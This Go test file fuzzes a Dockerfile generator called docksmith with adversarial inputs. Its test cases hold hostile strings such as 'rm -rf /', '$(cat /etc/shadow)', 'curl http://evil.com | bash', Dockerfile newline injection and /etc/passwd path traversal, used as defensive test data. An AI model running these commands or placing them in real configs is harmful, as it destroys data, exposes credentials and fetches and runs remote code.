package docksmith

import (
	"fmt"
	"math"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestPipeline_adversarialFrameworks(t *testing.T) {
	long := strings.Repeat("A", 10_000)
	unicode := "\u4f60\u597d\u0645\u0631\u062d\u0628\u0627\U0001F680\U0001F4A5"
	nulls := "hello\x00world\x00"

	cases := []struct {
		name string
		fw   Framework
	}{
		{"shell_metachar_build", Framework{Name: "express", BuildCommand: "npm run build; rm -rf /", StartCommand: "node app.js", Port: 3000}},
		{"backtick_start", Framework{Name: "express", BuildCommand: "npm run build", StartCommand: "`cat /etc/passwd`", Port: 3000}},
		{"dollar_paren_start", Framework{Name: "express", BuildCommand: "npm run build", StartCommand: "$(whoami)", Port: 3000}},
		{"name_spaces_slashes", Framework{Name: "express", BuildCommand: "build", StartCommand: "start", Port: 3000, OutputDir: "dist / .. / etc"}},
		{"port_zero", Framework{Name: "express", StartCommand: "node app.js", Port: 0}},
		{"port_negative", Framework{Name: "express", StartCommand: "node app.js", Port: -1}},
		{"port_huge", Framework{Name: "express", StartCommand: "node app.js", Port: 99999}},
		{"port_maxint", Framework{Name: "express", StartCommand: "node app.js", Port: math.MaxInt}},
		{"empty_name", Framework{Name: ""}},
		{"traversal_node_version", Framework{Name: "express", StartCommand: "node .", Port: 3000, NodeVersion: "../../etc/passwd"}},
		{"traversal_output_dir", Framework{Name: "nextjs", StartCommand: "node .", Port: 3000, OutputDir: "../../../etc"}},
		{"sysdep_injection", Framework{Name: "express", StartCommand: "node .", Port: 3000, SystemDeps: []string{"curl http://evil.com | bash"}}},
		{"all_long_strings", Framework{Name: "express", BuildCommand: long, StartCommand: long, Port: 3000, OutputDir: long, NodeVersion: long}},
		{"all_unicode", Framework{Name: "express", BuildCommand: unicode, StartCommand: unicode, Port: 3000, OutputDir: unicode}},
		{"all_nulls", Framework{Name: "express", BuildCommand: nulls, StartCommand: nulls, Port: 3000, OutputDir: nulls}},
		{"newline_in_build", Framework{Name: "express", BuildCommand: "npm build\nRUN whoami", StartCommand: "node .", Port: 3000}},
		{"cr_in_start", Framework{Name: "express", BuildCommand: "npm build", StartCommand: "node .\rUSER root", Port: 3000}},
		{"pipe_in_sysdeps", Framework{Name: "flask", StartCommand: "gunicorn app:app", Port: 8000, SystemDeps: []string{"gcc", "libpq-dev && curl evil.com"}}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()

			plan, err := Plan(&tc.fw)
			if err != nil {
				return // expected for adversarial input
			}

			out := EmitDockerfile(plan)
			if strings.ContainsAny(out, "\x00") {
				t.Error("null bytes in emitted Dockerfile")
			}
			for _, line := range strings.Split(out, "\n") {
				if strings.Contains(line, "\r") {
					t.Errorf("raw \\r in line: %q", line)
				}
			}
		})
	}
}

func TestConfig_adversarialValues(t *testing.T) {
	cases := []struct {
		name    string
		file    string
		content string
	}{
		{"unicode_runtime", "docksmith.toml", "runtime = \"\u4f60\u597d\"\nstart = \"run\""},
		{"injection_env_val", "docksmith.yaml", "runtime: node\nstart: node .\nenv:\n  PATH: \"$(cat /etc/shadow)\""},
		{"sysdep_metachar", "docksmith.yaml", "runtime: node\nstart: node .\nsystem_deps:\n  - \"curl evil.com | bash\""},
		{"newline_runtime", "docksmith.toml", "runtime = \"node\\nRUN whoami\"\nstart = \"node .\""},
		{"dollar_build", "docksmith.yaml", "runtime: node\nstart: node .\nbuild: \"$(cat /etc/shadow)\""},
		{"long_start", "docksmith.yaml", "runtime: node\nstart: \"" + strings.Repeat("x", 10_000) + "\""},
		{"port_zero", "docksmith.toml", "runtime = \"node\"\nstart = \"node .\"\nport = 0"},
		{"port_overflow", "docksmith.json", `{"runtime":"node","start":"node .","port":2147483648}`},
		{"deep_toml", "docksmith.toml", "runtime = \"node\"\nstart = \"node .\"\n[env]\n" + strings.Repeat("k = \"v\"\n", 100)},
		{"yaml_1000_env", "docksmith.yaml", "runtime: node\nstart: node .\nenv:\n" + genYAMLEnv(1000)},
		{"json_dup_keys", "docksmith.json", `{"runtime":"node","start":"node .","port":3000,"runtime":"go"}`},
		{"empty_toml", "docksmith.toml", ""},
		{"binary_garbage", "docksmith.yaml", "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()

			dir := t.TempDir()
			os.WriteFile(filepath.Join(dir, tc.file), []byte(tc.content), 0o644)
			cfg, err := LoadConfig(dir)
			if err != nil {
				return // adversarial — errors expected
			}
			if cfg == nil {
				return
			}
			fw := cfg.ToFramework()
			if fw.Name == "dockerfile" {
				return
			}
			plan, err := Plan(fw)
			if err != nil {
				return
			}
			out := EmitDockerfile(plan)
			if strings.Contains(out, "\x00") {
				t.Error("null bytes in output")
			}
		})
	}
}

func TestShellSplit_adversarial(t *testing.T) {
	cases := []struct {
		name  string
		input string
	}{
		{"empty", ""},
		{"single_word", "hello"},
		{"many_spaces", "a    b     c"},
		{"tabs_and_special", "a\tb\vc\f"},
		{"quotes_inside", `he"llo wo"rld`},
		{"very_long", strings.Repeat("word ", 20_000)},
		{"null_bytes", "hello\x00world"},
		{"only_whitespace", "   \t\t   "},
		{"newlines_mixed", "a\nb\rc\r\n"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()
			result := shellSplit(tc.input)
			if strings.Contains(result, "\x00") {
				t.Errorf("null bytes in result: %q", result)
			}
		})
	}
}

func TestJsonArray_adversarial(t *testing.T) {
	cases := []struct {
		name  string
		input string
	}{
		{"empty", ""},
		{"single_word", "node"},
		{"many_spaces", "a    b     c"},
		{"special_ws", "a\tb\vc"},
		{"quotes", `he"llo`},
		{"very_long", strings.Repeat("x ", 50_000)},
		{"null_bytes", "a\x00b"},
		{"only_ws", "   "},
		{"backslashes", `a\b\c`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()
			result := jsonArray(tc.input)
			if !strings.HasPrefix(result, "[") || !strings.HasSuffix(result, "]") {
				t.Errorf("malformed array: %q", result)
			}
		})
	}
}

func TestBuildPlan_fullPipelineStress(t *testing.T) {
	frameworks := []Framework{
		{Name: "nextjs", StartCommand: "node server.js", Port: 3000},
		{Name: "django", StartCommand: "gunicorn app.wsgi", Port: 8000},
		{Name: "flask", StartCommand: "gunicorn app:app", Port: 8000},
		{Name: "go-std", BuildCommand: "go build -o app .", StartCommand: "./app", Port: 8080},
		{Name: "rails", StartCommand: "rails server", Port: 3000},
		{Name: "laravel", StartCommand: "php artisan serve", Port: 80},
		{Name: "express", StartCommand: "node index.js", Port: 3000},
		{Name: "fastapi", StartCommand: "uvicorn main:app", Port: 8000},
		{Name: "spring-boot", StartCommand: "java -jar app.jar", Port: 8080},
		{Name: "aspnet-core", StartCommand: "dotnet run", Port: 8080, DotnetVersion: "8.0"},
		{Name: "rust-generic", StartCommand: "./app", Port: 8080},
		{Name: "static", Port: 80, OutputDir: "."},
		{Name: "bun", StartCommand: "bun run start", Port: 3000},
		{Name: "deno", StartCommand: "deno run --allow-net main.ts", Port: 8000},
		{Name: "elixir-phoenix", StartCommand: "mix phx.server", Port: 4000},
		{Name: "vite", BuildCommand: "npm run build", StartCommand: "serve", Port: 3000, OutputDir: "dist"},
	}

	for _, fw := range frameworks {
		t.Run(fw.Name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic on %s: %v", fw.Name, r)
				}
			}()

			plan, err := Plan(&fw)
			if err != nil {
				t.Skipf("Plan error (ok for stress): %v", err)
			}
			out := EmitDockerfile(plan)
			if out == "" {
				t.Fatal("empty Dockerfile output")
			}
			if !strings.HasPrefix(out, "# syntax=docker/dockerfile:1") {
				t.Error("missing BuildKit syntax directive")
			}
			if !strings.Contains(out, "FROM ") {
				t.Error("no FROM instruction found")
			}
		})
	}
}

func TestExtractDotPath_adversarial(t *testing.T) {
	cases := []struct {
		name string
		root any
		path string
	}{
		{"nil_root", nil, "a.b.c"},
		{"empty_path", map[string]any{"x": 1}, ""},
		{"only_dots", map[string]any{"x": 1}, "..."},
		{"points_to_array", map[string]any{"a": []any{1, 2, 3}}, "a"},
		{"points_to_number", map[string]any{"a": 42.0}, "a"},
		{"deep_100", buildDeepMap(100), strings.Repeat("k.", 99) + "k"},
		{"missing_key", map[string]any{"a": 1}, "z.z.z"},
		{"root_is_string", "hello", "a"},
		{"root_is_number", 42.0, "x"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()
			_ = extractDotPath(tc.root, tc.path)
		})
	}
}

func TestBuildkitCacheArgs_adversarial(t *testing.T) {
	cases := []struct {
		name  string
		appID string
	}{
		{"normal", "my-app"},
		{"injection", "my-app; rm -rf /"},
		{"empty", ""},
		{"very_long", strings.Repeat("a", 10_000)},
		{"traversal", "../../../etc/passwd"},
		{"null_bytes", "app\x00evil"},
		{"only_dots", "...."},
		{"slashes", "a/b\\c/d"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()

			args := BuildkitCacheArgs(tc.appID)
			if len(args) != 2 {
				t.Fatalf("expected 2 args, got %d", len(args))
			}
			for _, a := range args {
				if strings.Contains(a, "..") {
					t.Errorf("traversal in cache arg: %s", a)
				}
				if strings.Contains(a, "\x00") {
					t.Errorf("null byte in cache arg: %s", a)
				}
			}

			id := sanitizeAppID(tc.appID)
			if id == "" {
				t.Error("sanitizeAppID returned empty")
			}
		})
	}
}

func TestParseVersionString_adversarial(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  string
	}{
		{"lts", "lts/*", ""},
		{"stable", "stable", ""},
		{"node_alias", "node", ""},
		{"just_v", "v", ""},
		{"operators_only", ">=<~^", ""},
		{"comma_only", ">=,<", ""},
		{"caret_only", "^", ""},
		{"very_long", strings.Repeat("9", 10_000), strings.Repeat("9", 10_000)},
		{"negative", "-1.0", "-1.0"},
		{"float", "3.14159", "3.14159"},
		{"non_numeric", "abc.def", "abc.def"},
		{"spaces", "  18.2.0  ", "18.2.0"},
		{"v_prefix_version", "v20.1.0", "20.1.0"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()
			got := parseVersionString(tc.input)
			if got != tc.want {
				t.Errorf("parseVersionString(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

func TestGenerateDockerignore_adversarial(t *testing.T) {
	cases := []struct {
		name string
		fw   *Framework
	}{
		{"nil_fw", nil},
		{"empty_name", &Framework{Name: ""}},
		{"unknown_name", &Framework{Name: "totally-unknown-framework-xyz"}},
		{"unicode_name", &Framework{Name: "\u4f60\u597d"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()

			if tc.fw == nil {
				// GenerateDockerignore dereferences fw.Name — nil should panic or we guard it.
				// Test that the library at least doesn't segfault silently.
				func() {
					defer func() { recover() }()
					GenerateDockerignore(tc.fw)
				}()
				return
			}

			out := GenerateDockerignore(tc.fw)
			if out == "" {
				t.Error("expected non-empty dockerignore even for unknown framework")
			}
		})
	}
}

func TestSearchRegistry_adversarial(t *testing.T) {
	idx := &RegistryIndex{
		Frameworks: map[string]RegistryEntry{
			"nextjs": {Description: "Next.js framework", Runtime: "node"},
			"django": {Description: "Django web", Runtime: "python"},
		},
	}

	cases := []struct {
		name  string
		index *RegistryIndex
		query string
	}{
		{"nil_index", nil, "next"},
		{"empty_query", idx, ""},
		{"regex_chars", idx, "next.*js"},
		{"very_long", idx, strings.Repeat("x", 10_000)},
		{"brackets", idx, "[nextjs]"},
		{"null_bytes", idx, "next\x00js"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()

			if tc.index == nil {
				func() {
					defer func() { recover() }()
					SearchRegistry(tc.index, tc.query)
				}()
				return
			}

			results := SearchRegistry(tc.index, tc.query)
			if tc.query == "" && len(results) != len(tc.index.Frameworks) {
				t.Errorf("empty query returned %d, want %d", len(results), len(tc.index.Frameworks))
			}
		})
	}
}

func TestContainedPath_adversarial(t *testing.T) {
	base := t.TempDir()
	cases := []struct {
		name    string
		rel     string
		wantErr bool
	}{
		{"simple", "foo.txt", false},
		{"traversal", "../../../etc/passwd", true},
		{"absolute", "/etc/passwd", true},
		{"empty", "", true},
		{"null_bytes", "foo\x00bar", false},
		{"dot_dot_hidden", "foo/../../etc/passwd", true},
		{"double_slash", "foo//bar", false},
		{"tilde", "~/secret", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("panic: %v", r)
				}
			}()
			_, err := containedPath(base, tc.rel)
			if tc.wantErr && err == nil {
				t.Error("expected error")
			}
			if !tc.wantErr && err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}

func TestSanitizeDockerfileArg_adversarial(t *testing.T) {
	cases := []struct {
		name  string
		input string
	}{
		{"newline_injection", "apt-get install\nRUN whoami"},
		{"cr_injection", "value\rUSER root"},
		{"null_injection", "safe\x00evil"},
		{"mixed", "\n\r\x00all\nbad\r\x00"},
		{"empty", ""},
		{"very_long", strings.Repeat("x\n", 5000)},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			result := sanitizeDockerfileArg(tc.input)
			if strings.ContainsAny(result, "\n\r\x00") {
				t.Errorf("unsanitized chars in %q", result)
			}
		})
	}
}

func TestPlan_nilFramework(t *testing.T) {
	_, err := Plan(nil)
	if err == nil {
		t.Fatal("Plan(nil) should error")
	}
}

func TestGenerateDockerfile_nilAndDockerfile(t *testing.T) {
	out, err := GenerateDockerfile(nil)
	if err != nil || out != "" {
		t.Errorf("nil fw: got %q, %v", out, err)
	}
	out, err = GenerateDockerfile(&Framework{Name: "dockerfile"})
	if err != nil || out != "" {
		t.Errorf("dockerfile fw: got %q, %v", out, err)
	}
}

// helpers

func buildDeepMap(depth int) any {
	if depth <= 0 {
		return "leaf"
	}
	return map[string]any{"k": buildDeepMap(depth - 1)}
}

func genYAMLEnv(n int) string {
	var b strings.Builder
	for i := 0; i < n; i++ {
		fmt.Fprintf(&b, "  KEY_%04d: val_%04d\n", i, i)
	}
	return b.String()
}
